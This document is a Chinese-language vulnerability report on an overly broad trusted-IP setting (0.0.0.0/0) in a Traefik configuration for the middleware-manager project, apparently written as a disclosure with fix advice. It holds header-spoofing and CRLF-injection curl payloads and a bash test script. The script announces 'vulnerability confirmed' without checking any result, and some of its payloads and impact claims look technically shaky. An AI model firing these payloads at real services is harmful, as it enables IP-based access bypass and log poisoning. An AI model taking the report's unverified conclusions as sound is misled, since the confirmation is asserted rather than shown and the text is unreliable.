# CVE-2025-XXXXX: Overly Permissive Trusted IPs in hhftechnology/middleware-manager Traefik Configuration

## 基本信息

- **CVE ID**: CVE-2025-XXXXX (待分配)
- **项目**: hhftechnology/middleware-manager
- **发现日期**: 2025-12-28
- **报告者**: Security Research
- **严重程度**: High (CVSS 7.5)
- **项目星级**: 410 stars

## 漏洞描述

hhftechnology/middleware-manager 项目中的 Traefik 配置存在 HTTP Header Injection 漏洞。配置文件中设置了 `forwardedHeadersTrustedIPs: ["0.0.0.0/0"]`，这等同于没有白名单，导致 Traefik 信任所有来源的 X-Forwarded-* 头。

## 受影响文件

- `config/templates.yaml`

## 漏洞配置

```yaml
forwardedHeadersTrustedIPs:
  - "0.0.0.0/0"
```

## 漏洞详情

### 问题分析

1. **配置问题**: `forwardedHeadersTrustedIPs: ["0.0.0.0/0"]` **等同于没有白名单**
   - `0.0.0.0/0` 匹配所有 IPv4 地址
   - 这意味着信任所有来源的 X-Forwarded-* 头
2. **影响**: Traefik 会信任**所有来源**的 X-Forwarded-* 头
3. **攻击向量**: 攻击者可以直接向 Traefik 发送恶意请求

### 攻击场景

```
攻击者 → Traefik (trustedIPs: 0.0.0.0/0, 等同于无白名单) → 后端服务
```

### 攻击载荷示例

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1\r\nX-Injected-Header: malicious-value\r\n
```

## 影响评估

### CVSS 3.1 评分

- **Base Score**: 7.5 (High)
- **Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N

### 实际影响

1. **日志注入** ✅ **几乎肯定发生**
   - 后端服务会记录 X-Forwarded-For 到日志
   - 攻击者可以注入恶意内容污染日志
   - 影响日志分析和安全审计

2. **IP 欺骗** ✅ **很可能发生**
   - 如果后端服务使用 X-Forwarded-For 进行访问控制
   - 攻击者可以伪造 IP 地址
   - 可能绕过 IP 白名单和地理位置限制

3. **响应拆分** ⚠️ **可能发生**
   - 如果后端在响应中回显 X-Forwarded-For
   - 可能导致缓存投毒和 XSS

## 威胁模型

### 攻击前提条件

1. Traefik 配置了 `forwardedHeadersTrustedIPs: ["0.0.0.0/0"]`
2. 这等同于没有白名单
3. 攻击者能够直接访问 Traefik 或通过未受信任的代理访问

### 攻击步骤

1. 攻击者构造包含恶意 X-Forwarded-For 头的 HTTP 请求
2. Traefik 信任并转发该头到后端服务（因为 `0.0.0.0/0` 匹配所有 IP）
3. 后端服务处理该头，可能导致日志注入或 IP 欺骗

## 修复建议

### 方案 1: 配置正确的 trustedIPs 白名单（推荐）

```yaml
forwardedHeadersTrustedIPs:
  - "10.0.0.0/8"
  - "172.16.0.0/12"
  - "192.168.0.0/16"
  # 移除 "0.0.0.0/0"
```

### 方案 2: 如果不需要 forwardedHeaders，移除配置

如果不需要 forwardedHeaders 功能，可以移除相关配置。

## 漏洞复现

### 环境准备

1. **克隆项目仓库**:
   ```bash
   git clone https://github.com/hhftechnology/middleware-manager.git
   cd middleware-manager
   ```

2. **检查漏洞配置**:
   ```bash
   # 查看 config/templates.yaml 中的配置
   cat config/templates.yaml | grep -A 5 -B 5 "forwardedHeadersTrustedIPs"
   
   # 应该看到：
   # forwardedHeadersTrustedIPs:
   #   - "0.0.0.0/0"
   # 这等同于没有白名单
   ```

3. **部署配置**:
   ```bash
   # 根据项目文档部署（可能是 Kubernetes 或 Docker Compose）
   # 检查部署文档
   cat README.md
   ```

### 漏洞复现步骤

#### 步骤 1: 确认白名单范围过宽的配置

```bash
# 检查配置文件
cat config/templates.yaml | grep -A 3 "forwardedHeadersTrustedIPs"

# 应该看到：
# forwardedHeadersTrustedIPs:
#   - "0.0.0.0/0"
# 
# 注意：0.0.0.0/0 匹配所有 IPv4 地址，等同于没有白名单
```

#### 步骤 2: 验证 0.0.0.0/0 等同于无白名单

```bash
# 0.0.0.0/0 表示所有 IPv4 地址，这意味着：
# - 任何来源的 X-Forwarded-* 头都会被信任
# - 等同于没有配置白名单
# - 攻击者可以从任何 IP 地址注入恶意头

# 计算 CIDR 范围
echo "0.0.0.0/0 covers:"
echo "  - All IPv4 addresses (0.0.0.0 to 255.255.255.255)"
echo "  - Total: 4,294,967,296 addresses"
echo "  - This is equivalent to NO whitelist"
```

#### 步骤 3: 测试日志注入漏洞

```bash
# 获取 Traefik 服务地址（根据实际部署方式）
# 如果使用 Kubernetes
TRAEFIK_IP=$(kubectl get svc traefik -o jsonpath='{.status.loadBalancer.ingress[0].ip}')

# 如果使用 Docker Compose
TRAEFIK_IP=$(docker-compose ps -q traefik | xargs docker inspect | jq -r '.[0].NetworkSettings.Networks | to_entries[0].value.IPAddress')

# 从任意 IP 地址测试（因为 0.0.0.0/0 允许所有 IP）
curl -v -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Forwarded-Proto: https" \
     -H "X-Injected-Header: malicious-value" \
     http://$TRAEFIK_IP:80/

# CRLF 注入
curl -v -H "X-Forwarded-For: 127.0.0.1%0D%0AX-Log-Injection: CRLF-TEST" \
     http://$TRAEFIK_IP:80/

# 从外部 IP 测试（证明 0.0.0.0/0 允许所有来源）
curl -v -H "X-Forwarded-For: 8.8.8.8" \
     -H "X-Injected-Header: from-external-ip" \
     http://$TRAEFIK_IP:80/
```

#### 步骤 4: 测试 IP 欺骗漏洞

```bash
# 伪造本地 IP
curl -v -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Real-IP: 127.0.0.1" \
     http://$TRAEFIK_IP:80/

# 伪造内网 IP
curl -v -H "X-Forwarded-For: 10.0.0.1" \
     http://$TRAEFIK_IP:80/

# 伪造公网 IP
curl -v -H "X-Forwarded-For: 203.0.113.1" \
     http://$TRAEFIK_IP:80/

# 所有请求都会被接受，因为 0.0.0.0/0 匹配所有 IP
```

#### 步骤 5: 对比测试（证明漏洞）

```bash
# 测试 1: 使用 0.0.0.0/0（当前配置，有漏洞）
echo "[*] Test with 0.0.0.0/0 (vulnerable)"
curl -s -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Injected-Test: vulnerable" \
     http://$TRAEFIK_IP:80/ > /dev/null
echo "  [+] Request accepted (vulnerable)"

# 测试 2: 如果修复为正确的白名单（10.0.0.0/8），应该拒绝外部 IP
# 注意：这需要先修复配置
echo "[*] After fix: Should reject external IPs"
echo "  [ ] Need to update config to use proper whitelist"
```

#### 步骤 6: 验证漏洞

```bash
# 查看后端服务日志
# 如果使用 Kubernetes
kubectl logs -l app=backend | grep -i "forwarded" | tail -20

# 如果使用 Docker Compose
docker-compose logs backend | grep -i "forwarded" | tail -20

# 查看 Traefik 日志
docker-compose logs traefik | tail -30

# 应该能看到从任意 IP 地址注入的恶意内容
```

### 预期结果

1. **所有 IP 都被信任**: 因为 `0.0.0.0/0` 匹配所有 IPv4 地址
2. **日志注入成功**: 从任何 IP 地址都可以注入恶意内容
3. **IP 欺骗成功**: 可以伪造任何 IP 地址
4. **等同于无白名单**: `0.0.0.0/0` 在功能上等同于没有配置白名单

### 自动化测试脚本

```bash
#!/bin/bash
# 根据实际部署方式获取 TraefIK IP
if command -v kubectl &> /dev/null; then
    TRAEFIK_IP=$(kubectl get svc traefik -o jsonpath='{.status.loadBalancer.ingress[0].ip}')
elif command -v docker-compose &> /dev/null; then
    TRAEFIK_IP=$(docker-compose ps -q traefik | xargs docker inspect | jq -r '.[0].NetworkSettings.Networks | to_entries[0].value.IPAddress')
else
    echo "Error: Cannot find Traefik IP"
    exit 1
fi

echo "[*] Testing Overly Permissive Trusted IPs (0.0.0.0/0)"
echo "[*] Target: $TRAEFIK_IP:80"
echo "[*] Note: 0.0.0.0/0 is equivalent to NO whitelist"

# Test 1: From localhost (should be accepted)
echo "[+] Test 1: Injection from localhost"
curl -s -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Injected-Test: from-localhost" \
     http://$TRAEFIK_IP:80/ > /dev/null

# Test 2: From internal IP (should be accepted)
echo "[+] Test 2: Injection from internal IP"
curl -s -H "X-Forwarded-For: 10.0.0.1" \
     -H "X-Injected-Test: from-internal" \
     http://$TRAEFIK_IP:80/ > /dev/null

# Test 3: From external IP (should be accepted - this is the problem!)
echo "[+] Test 3: Injection from external IP (PROBLEM: should be rejected)"
curl -s -H "X-Forwarded-For: 8.8.8.8" \
     -H "X-Injected-Test: from-external" \
     http://$TRAEFIK_IP:80/ > /dev/null

echo "[*] All tests passed (vulnerability confirmed)"
echo "[*] Check logs to verify injection from all IPs"
```

### 修复验证

修复后应该测试：

```bash
# 修复配置后，外部 IP 应该被拒绝
echo "[*] After fix: Testing with proper whitelist"

# 从内网 IP 测试（应该被接受）
curl -s -H "X-Forwarded-For: 10.0.0.1" \
     http://$TRAEFIK_IP:80/
echo "  [+] Internal IP accepted (correct)"

# 从外部 IP 测试（应该被拒绝或使用真实 IP）
curl -s -H "X-Forwarded-For: 8.8.8.8" \
     http://$TRAEFIK_IP:80/
echo "  [-] External IP should be rejected or use real IP (correct)"
```

## 验证方法

### 测试步骤

1. 部署使用该配置的 Traefik（见上方详细步骤）
2. 从任意 IP 地址发送包含恶意 X-Forwarded-For 头的请求
3. 检查后端服务日志，确认是否包含注入的内容
4. **关键验证**: 确认 `0.0.0.0/0` 允许从任何 IP 地址注入，等同于没有白名单

## 时间线

- 2025-12-28: 漏洞发现
- 2025-12-28: 报告生成

## 参考

- Traefik 文档: https://doc.traefik.io/traefik/routing/entrypoints/#forwarded-headers
- OWASP HTTP Header Injection: https://owasp.org/www-community/attacks/HTTP_Header_Injection
- CIDR 表示法: `0.0.0.0/0` 表示所有 IPv4 地址

## 备注

这是高星项目（410 stars），可能被广泛使用。`0.0.0.0/0` 等同于没有白名单，建议尽快修复为正确的 IP 范围。

